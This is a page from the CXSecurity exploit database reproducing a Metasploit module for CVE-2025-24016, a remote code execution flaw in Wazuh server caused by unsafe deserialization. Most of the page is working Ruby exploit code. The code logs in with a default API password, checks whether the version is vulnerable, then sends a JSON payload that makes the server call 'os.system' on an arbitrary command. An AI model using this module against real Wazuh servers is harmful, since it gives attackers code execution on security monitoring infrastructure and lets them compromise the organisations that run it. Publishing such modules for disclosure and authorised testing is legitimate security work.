---
title: Wazuh Server Remote Code Execution
url: https://cxsecurity.com/issue/WLB-2025080013
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2025-08-14
fetch_date: 2025-10-07T00:17:48.018741
---

# Wazuh Server Remote Code Execution

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **Wazuh Server Remote Code Execution** **2025.08.13**  Credit:  **[h00die-gr3y](https://cxsecurity.com/author/h00die-gr3y/1/)**  Risk: **High**  Local: **No**  Remote: ****Yes****  CVE: **[CVE-2025-24016](https://cxsecurity.com/cveshow/CVE-2025-24016/ "Click to see CVE-2025-24016")**  CWE: **N/A** | |

##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
class MetasploitModule < Msf::Exploit::Remote
Rank = ExcellentRanking
include Msf::Exploit::Remote::HttpClient
prepend Msf::Exploit::Remote::AutoCheck
def initialize(info = {})
super(
update\_info(
info,
'Name' => 'Wazuh server remote code execution caused by an unsafe deserialization vulnerability.',
'Description' => %q{
Wazuh is a free and open source platform used for threat prevention, detection, and response.
Starting in version 4.4.0 and prior to version 4.9.1, an unsafe deserialization vulnerability
allows for remote code execution on Wazuh servers. DistributedAPI parameters are serialized
as JSON and deserialized using `as\_wazuh\_object` (in `framework/wazuh/core/cluster/common.py`).
If an attacker manages to inject an unsanitized dictionary in DAPI request/response, they can
forge an unhandled exception (`\_\_unhandled\_exc\_\_`) to evaluate arbitrary python code.
The vulnerability can be triggered by anybody with API access (compromised dashboard or Wazuh
servers in the cluster) or, in certain configurations, even by a compromised agent.
},
'Author' => [
'h00die-gr3y <h00die.gr3y[at]gmail.com>', # Metasploit module & default password weakness
'DanielFi https://github.com/DanielFi', # Discovery
],
'References' => [
['CVE', '2025-24016'],
['URL', 'https://github.com/wazuh/wazuh/security/advisories/GHSA-hcrc-79hj-m3qh'],
['URL', 'https://attackerkb.com/topics/piW0q4r5Uy/cve-2025-24016']
],
'License' => MSF\_LICENSE,
'Platform' => ['unix', 'linux'],
'Privileged' => false,
'Arch' => [ARCH\_CMD],
'Targets' => [
[
'Unix/Linux Command',
{
'Platform' => ['unix', 'linux'],
'Arch' => ARCH\_CMD,
'Type' => :unix\_cmd
}
]
],
'DefaultTarget' => 0,
'DisclosureDate' => '2025-02-10',
'DefaultOptions' => {
'SSL' => true,
'RPORT' => 55000
},
'Notes' => {
'Stability' => [CRASH\_SAFE],
'SideEffects' => [ARTIFACTS\_ON\_DISK, IOC\_IN\_LOGS],
'Reliability' => [REPEATABLE\_SESSION]
}
)
)
register\_options([
OptString.new('TARGETURI', [true, 'Path to the wazuh manager', '/']),
OptString.new('API\_USER', [true, 'Wazuh API user', 'wazuh-wui']),
OptString.new('API\_PWD', [true, 'Wazuh API password', 'MyS3cr37P450r.\*-'])
])
end
# get Wazuh API token
# return token if API login is successful else nil
def get\_api\_token
res = send\_request\_cgi({
'method' => 'POST',
'uri' => normalize\_uri(target\_uri.path, 'security', 'user', 'authenticate'),
'headers' => {
'Authorization' => basic\_auth(datastore['API\_USER'], datastore['API\_PWD'])
}
})
return unless res&.code == 200 && res.body.include?('token')
res\_json = res.get\_json\_document
res\_json['data']['token'] unless res\_json.blank?
end
# get the Wazuh version
# return version if successful else nil
def get\_wazuh\_version(api\_token)
api\_auth = "Bearer #{api\_token}"
res = send\_request\_cgi({
'method' => 'GET',
'uri' => normalize\_uri(target\_uri.path),
'headers' => {
'Authorization' => api\_auth.to\_s
}
})
return unless res&.code == 200 && res.body.include?('api\_version')
res\_json = res.get\_json\_document
res\_json['data']['api\_version'] unless res\_json.blank?
end
# CVE-2025-24016: Command Injection leading to RCE via unsafe deserialization vulnerability
def execute\_payload(cmd, \_opts = {})
# {"\_\_unhandled\_exc\_\_":{"\_\_class\_\_": "os.system", "\_\_args\_\_": ["cmd"]}}
post\_data = {
\_\_unhandled\_exc\_\_: {
\_\_class\_\_: 'os.system',
\_\_args\_\_: [ cmd.to\_s ]
}
}.to\_json
send\_request\_cgi({
'method' => 'POST',
'uri' => normalize\_uri(target\_uri.path, 'security', 'user', 'authenticate', 'run\_as'),
'ctype' => 'application/json',
'headers' => {
'Authorization' => basic\_auth(datastore['API\_USER'], datastore['API\_PWD'])
},
'data' => post\_data.to\_s
})
end
def check
# check Wazuh API access with the API credentials
api\_token = get\_api\_token
return CheckCode::Unknown('Can not access the Wazuh API with provided credentials.') if api\_token.nil?
version = get\_wazuh\_version(api\_token)
return CheckCode::Detected('Can not determine the Wazuh version.') if version.nil?
version = Rex::Version.new(version)
unless version >= Rex::Version.new('4.4.0') && version < Rex::Version.new('4.9.1')
return CheckCode::Safe("Wazuh version #{version}")
end
CheckCode::Appears("Wazuh version #{version}")
end
def exploit
print\_status("Executing #{target.name} for #{datastore['PAYLOAD']}")
execute\_payload(payload.encoded)
end
end

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2025080013)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2025**, cxsecurity.com

|  |

Back to Top